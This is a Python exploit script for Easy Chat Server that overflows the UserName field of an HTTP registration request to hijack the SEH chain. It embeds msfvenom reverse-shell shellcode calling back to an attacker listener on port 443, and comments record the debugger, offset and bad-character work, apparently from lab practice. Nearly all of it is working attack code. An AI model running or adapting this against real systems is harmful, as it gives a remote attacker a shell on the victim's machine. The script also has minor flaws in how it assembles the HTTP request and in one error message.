#!/usr/bin/python3

from struct import pack
import pwn
import socket
import sys


def main() :
    server = sys.argv[1]
    payload = buildPayload()
    sendPayload(server, payload)


def buildPayload():
    # Attach windbg to EasyChat.exe

    # 0:008> !nmod
    # 00400000 0048d000 easychat             /SafeSEH OFF                C:\EFS Software\Easy Chat Server\easychat.exe
    # 00860000 00931000 LIBEAY32             /SafeSEH OFF                C:\EFS Software\Easy Chat Server\LIBEAY32.dll
    # 10000000 10027000 SSLEAY32             /SafeSEH OFF                C:\EFS Software\Easy Chat Server\SSLEAY32.dll

    payloadSize = 0x2000
    badchars = b"\x00\x0a\x0d\x25\x26\x2b"

    buf  = b""

    # buf += pwn.cyclic(payloadSize)
    offBufSeh = 0xdd                                            # pwn.cyclic_find(0x67636161

    buf += b"A" * (offBufSeh - len(buf) - 4)                    # padding

    buf += b"\xeb\x06\x90\x90"                                  # short jump over NSEH
    buf += pack("<I", 0x1001b2e1)                               # SEH pop/pop/ret

    buf += b"\x90" * 0x20                                       # nopsled

    # buf += b"\xcc"                                            # int3 / debug break point

    # buf += bytes([ b for b in range(0x100)
    #                  if b not in badchars])

    # shellcode
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.191 LPORT=443 -f python -b "\x00\x0a\x0d\x25\x26\x2b"
    # nc -vlnp 443
    buf += b"\xbe\x31\xbe\x2f\x44\xda\xd1\xd9\x74\x24\xf4\x58"
    buf += b"\x31\xc9\xb1\x52\x83\xe8\xfc\x31\x70\x0e\x03\x41"
    buf += b"\xb0\xcd\xb1\x5d\x24\x93\x3a\x9d\xb5\xf4\xb3\x78"
    buf += b"\x84\x34\xa7\x09\xb7\x84\xa3\x5f\x34\x6e\xe1\x4b"
    buf += b"\xcf\x02\x2e\x7c\x78\xa8\x08\xb3\x79\x81\x69\xd2"
    buf += b"\xf9\xd8\xbd\x34\xc3\x12\xb0\x35\x04\x4e\x39\x67"
    buf += b"\xdd\x04\xec\x97\x6a\x50\x2d\x1c\x20\x74\x35\xc1"
    buf += b"\xf1\x77\x14\x54\x89\x21\xb6\x57\x5e\x5a\xff\x4f"
    buf += b"\x83\x67\x49\xe4\x77\x13\x48\x2c\x46\xdc\xe7\x11"
    buf += b"\x66\x2f\xf9\x56\x41\xd0\x8c\xae\xb1\x6d\x97\x75"
    buf += b"\xcb\xa9\x12\x6d\x6b\x39\x84\x49\x8d\xee\x53\x1a"
    buf += b"\x81\x5b\x17\x44\x86\x5a\xf4\xff\xb2\xd7\xfb\x2f"
    buf += b"\x33\xa3\xdf\xeb\x1f\x77\x41\xaa\xc5\xd6\x7e\xac"
    buf += b"\xa5\x87\xda\xa7\x48\xd3\x56\xea\x04\x10\x5b\x14"
    buf += b"\xd5\x3e\xec\x67\xe7\xe1\x46\xef\x4b\x69\x41\xe8"
    buf += b"\xac\x40\x35\x66\x53\x6b\x46\xaf\x90\x3f\x16\xc7"
    buf += b"\x31\x40\xfd\x17\xbd\x95\x52\x47\x11\x46\x13\x37"
    buf += b"\xd1\x36\xfb\x5d\xde\x69\x1b\x5e\x34\x02\xb6\xa5"
    buf += b"\xdf\xed\xef\x88\xa0\x86\xed\xd2\xdf\xed\x7b\x34"
    buf += b"\xb5\x01\x2a\xef\x22\xbb\x77\x7b\xd2\x44\xa2\x06"
    buf += b"\xd4\xcf\x41\xf7\x9b\x27\x2f\xeb\x4c\xc8\x7a\x51"
    buf += b"\xda\xd7\x50\xfd\x80\x4a\x3f\xfd\xcf\x76\xe8\xaa"
    buf += b"\x98\x49\xe1\x3e\x35\xf3\x5b\x5c\xc4\x65\xa3\xe4"
    buf += b"\x13\x56\x2a\xe5\xd6\xe2\x08\xf5\x2e\xea\x14\xa1"
    buf += b"\xfe\xbd\xc2\x1f\xb9\x17\xa5\xc9\x13\xcb\x6f\x9d"
    buf += b"\xe2\x27\xb0\xdb\xea\x6d\x46\x03\x5a\xd8\x1f\x3c"
    buf += b"\x53\x8c\x97\x45\x89\x2c\x57\x9c\x09\x5c\x12\xbc"
    buf += b"\x38\xf5\xfb\x55\x79\x98\xfb\x80\xbe\xa5\x7f\x20"
    buf += b"\x3f\x52\x9f\x41\x3a\x1e\x27\xba\x36\x0f\xc2\xbc"
    buf += b"\xe5\x30\xc7"

    buf += b"Z" * (payloadSize - len(buf))                      # padding

    # some sanity checks
    assert len(buf) == payloadSize, "Mismatching size: f{len(buf)} != f{payloadSize}"
    for b in badchars:
        assert b not in buf, print(f"Error: badchar {hex(b)} ('{chr(b)}') appeared in payload", "\n\n", pwn.hexdump(buf))

    return buf


def sendPayload(server, payload):
    buf  = b"POST /registresult.htm HTTP/1.1\r\n\r\n"
    buf += b"Host: 192.168.1.11"
    buf += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
    buf += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    buf += b"Accept-Language: en-US,en;q=0.5"
    buf += b"Accept-Encoding: gzip, deflate"
    buf += b"Referer: http://192.168.1.11/register.ghp"
    buf += b"Connection: close"
    buf += b"Content-Type: application/x-www-form-urlencoded"
    buf += b"UserName=" + payload + b"&Password=test&Password1=test&Sex=1&Email=x@&Icon=x.gif&Resume=xxxx&cw=1&RoomID=4&RepUserName=admin&submit1=Register" 

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, 80))
    s.send(buf)
    s.close()


if __name__ == "__main__":
    main()
